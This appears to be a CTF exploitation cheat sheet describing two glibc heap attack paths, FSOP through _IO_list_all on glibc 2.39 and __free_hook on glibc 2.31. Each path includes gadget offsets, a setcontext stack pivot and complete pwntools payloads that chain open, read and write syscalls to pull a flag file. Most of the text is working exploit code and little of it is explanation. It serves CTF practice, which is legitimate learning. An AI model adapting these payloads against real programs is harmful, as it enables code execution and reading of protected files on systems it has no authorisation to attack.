## ***# pre-requisites***
- have libc and heap addr
- arb write
- only allow ORW
- know the absolute path of flag
- gadget `syscall ; ret` : 
```bash
objdump -D -Mintel ./libc.so.6 | grep -B 1 ret | grep -A 1 syscall
```
## I. FSOP path / ***cccc revenge - dreamhack***
- glibc tested: 2.39
- idea: overwrite a FILE struct addr (`_IO_list_all` for eg) -> overwrite `__doallocate` with a chain of available gadgets (ROP) so that `exit()` will trigger that chain through `IO_flush_all`->`_IO_wfile_overflow`
### 1. gadgets
```Python
# call gadgets
"""
0x764a8c176f3e:      mov    rdx,QWORD PTR [rax+0x38]
0x764a8c176f42:      mov    rdi,rax
0x764a8c176f45:      call   QWORD PTR [rdx+0x20]
"""
call_gadgets = libc.address + 0x176f3e

# setcontext gadgets
"""
0x0000764a8c04a99d <+61>:    mov    rsp,QWORD PTR [rdx+0xa0]
0x0000764a8c04a9a4 <+68>:    mov    rbx,QWORD PTR [rdx+0x80]
0x0000764a8c04a9ab <+75>:    mov    rbp,QWORD PTR [rdx+0x78]
0x0000764a8c04a9af <+79>:    mov    r12,QWORD PTR [rdx+0x48]
0x0000764a8c04a9b3 <+83>:    mov    r13,QWORD PTR [rdx+0x50]
0x0000764a8c04a9b7 <+87>:    mov    r14,QWORD PTR [rdx+0x58]
0x0000764a8c04a9bb <+91>:    mov    r15,QWORD PTR [rdx+0x60]
"""
setcontext_gadgets = libc.symbols["setcontext"] + 61

# other gadgets
pop_rdi = libc.address + 0x000000000010f78b
pop_rsi = libc.address + 0x0000000000110a7d
pop_rdx = libc.address + 0x00000000000b503c # pop rdx ; xor eax, eax ; pop rbx ; pop r12 ; pop r13 ; pop rbp ; ret
pop_rax = libc.address + 0x00000000000dd237
syscall_ret = libc.address + 0x98fb6
```
### 2. sample payload
```Python
fake_1 = flat(
    {
        0x20: 0x0,                                      # write_base
        0x28: 0x10,                                     # write_ptr
        0x88: libc.symbols['_IO_2_1_stdout_'] + 0x50,   # lock
        0xa0: heap_base + 0x500,                        # wide_data / rax
        0xc0: 0x0,                                      # _mode
        0xd8: libc.symbols['_IO_wfile_jumps']           # vtable
    },  filler=b'\0', length=0xe0
).ljust(0x100, b"\x00")

fake_2 = flat(
    {
        0x30: 0x0,                                      # wide_data->buf_base
        0xe0: heap_base + 0x600,                        # wide_vtable / rax
    }, filler=b'\0', length=0x100
).ljust(0x100, b"\x00")

fake_3 = flat(                                          
    {
        0x38: heap_base + 0x700,                        # rdx / [rax+0x38]
        0x68: call_gadgets                              # doallocate
    }, filler=b'\0', length=0x70
).ljust(0x100, b"\x00")

fake_4 = flat(
    {
        0x20: setcontext_gadgets,                       # [rdx + 0x20]
        0xa0: heap_base + 0x800,                        # rsp / [rdx+0xa0]
        """
        0x00007ffff7c4aa86 <+294>:   mov    rcx, QWORD PTR [rdx+0xa8]
		0x00007ffff7c4aa8d <+301>:   push   rcx                      
        """
        0xa8: pop_rdi + 1                               # rcx / rsp - 0x8
    }, filler=b'\0', length=0xb0
).ljust(0x100, b"\x00")

buf_addr = heap_base + 0x15000
flag_addr = heap_base + 0x400 + 0x400 + 0x200
chain = flat(
    # open
    pop_rdi, flag_addr,   # rdi = flag_addr
    pop_rsi, 0,           # rsi = 0 (O_RDONLY)
    pop_rdx, 0, 0, 0, 0, 0, # rdx = 0 (mode)
    pop_rax, 2,           # rax = 2 (sys_open)
    syscall_ret,

    # read
    pop_rdi, 3,           # fd = 3
    pop_rsi, buf_addr,    # rsi = a heap addr to store the flag
    pop_rdx, 0x100, 0, 0, 0, 0, # rdx = 0x100 (size)
    pop_rax, 0,           # rax = 0 (sys_read)
    syscall_ret,

    # write
    pop_rdi, 1,           # fd = 1 (stdout)
    pop_rsi, buf_addr,    # rsi = a heap addr to store the flag
    pop_rdx, 0x100, 0, 0, 0, 0, # rdx = 0x100 (size)
    pop_rax, 1,           # rax = 1 (sys_write)
    syscall_ret
)
chain = chain.ljust(0x200, b"\x00")
flag_name = b"flag-fdf0e86357b2045fc4d7c6ddba6c5742f1f24dd2920d6eb0148f6403db75947b.txt\x00"
chain += flag_name
chain = chain.ljust(0x300, b"\x00")

s(fake_1 + fake_2 + fake_3 + fake_4 + chain)
```
## II. `__free_hook` path / ***mida's blog***
- glibc tested: 2.31
- idea: overwrite `__free_hook` with a chain of available gadgets (ROP) so that when free a chunk, that chain will be triggered
### 1. gadgets
```Python
# call gadgets
"""
mov     rdx, [rdi+8]
mov     [rsp], rax
call    qword ptr [rdx+0x20]
"""
call_gadget = libc.address + 0x154930

# setcontext gadgets
"""
mov     rsp, [rdx+0A0h]
mov     rbx, [rdx+80h]
mov     rbp, [rdx+78h]
mov     r12, [rdx+48h]
mov     r13, [rdx+50h]
mov     r14, [rdx+58h]
mov     r15, [rdx+60h]
test    dword ptr fs:48h, 2
jz      loc_581C6

loc_581C6:
mov     rcx, [rdx+0A8h]
push    rcx
mov     rsi, [rdx+70h]
mov     rdi, [rdx+68h]
mov     rcx, [rdx+98h]
mov     r8, [rdx+28h]
mov     r9, [rdx+30h]
mov     rdx, [rdx+88h]
xor     eax, eax
ret
"""
setcontext_gadget = libc.address + 0x580DD

# other gadgets
# libc.address is leaked base of libc
pop_rdi = libc.address + 0x26b72
pop_rsi = libc.address + 0x27529
pop_rdx_r12 = libc.address + 0x11c371
push_rax = libc.address + 0x45197
pop_rax = libc.address + 0x4a550
xchg_eax_edi = libc.address + 0x2ad2b
syscall_ret = libc.address + 0x66229
```
### 2. sample payload
```Python
# call_gadget chain
base = heap + <.....>             # payload_base (address of the chunk)
payload = b"A"*8                  # <-- [rdi] <-- payload_base
payload += p64(base)              # <-- [rdi + 8] = rdx
payload += b"B"*0x10              # padding
payload += p64(setcontext_gadget) # <-- [rdx + 0x20]

# setcontext chain
payload += p64(0)                 # <-- [rdx + 0x28] = r8
payload += p64(0)                 # <-- [rdx + 0x30] = r9
payload += b"A"*0x10              # padding
payload += p64(0)                 # <-- [rdx + 0x48] = r12
payload += p64(0)                 # <-- [rdx + 0x50] = r13
payload += p64(0)                 # <-- [rdx + 0x58] = r14
payload += p64(0)                 # <-- [rdx + 0x60] = r15
payload += p64(base + 0x258)      # <-- [rdx + 0x68] = rdi (ptr to flag path)
payload += p64(0)                 # <-- [rdx + 0x70] = rsi (flag = O_RDONLY)
payload += p64(0)                 # <-- [rdx + 0x78] = rbp
payload += p64(0)                 # <-- [rdx + 0x80] = rbx
payload += p64(0)                 # <-- [rdx + 0x88] = rdx 
payload += b"A"*8                 # padding
payload += p64(0)                 # <-- [rdx + 0x98] = rcx 
payload += p64(base + 0x1b0)      # <-- [rdx + 0xa0] = rsp, perfectly setup for it to ret into our chain
payload += p64(pop_rax)           # <-- [rdx + 0xa8] = rcx, will be pushed to rsp

# orw chain
## open
payload += p64(2)
payload += p64(syscall_ret) # sys_open("/path/to/flag", O_RDONLY)
## read
payload += p64(xchg_eax_edi)   # fd of open saved in rax -> swap rax vs rdi to make sure fd of read correct
payload += p64(pop_rsi)
payload += p64(heap + 0x15000) # destination buffer, can be anywhere readable and writable
payload += p64(pop_rdx_r12)
payload += p64(0x100) + p64(0) # nbytes
payload += p64(pop_rax)
payload += p64(0)
payload += p64(syscall_ret) # sys_read(eax, heap + 0x15000, 0x100)
## write
payload += p64(pop_rdi)
payload += p64(1)
payload += p64(pop_rsi)
payload += p64(heap + 0x15000) # buffer
payload += p64(pop_rdx_r12)
payload += p64(0x100) + p64(0) # nbytes
payload += p64(pop_rax)
payload += p64(1)
payload += p64(syscall_ret) # sys_write(1, heap + 0x15000, 0x100)
payload += b"/path/to/flag"    # base + 0x258
```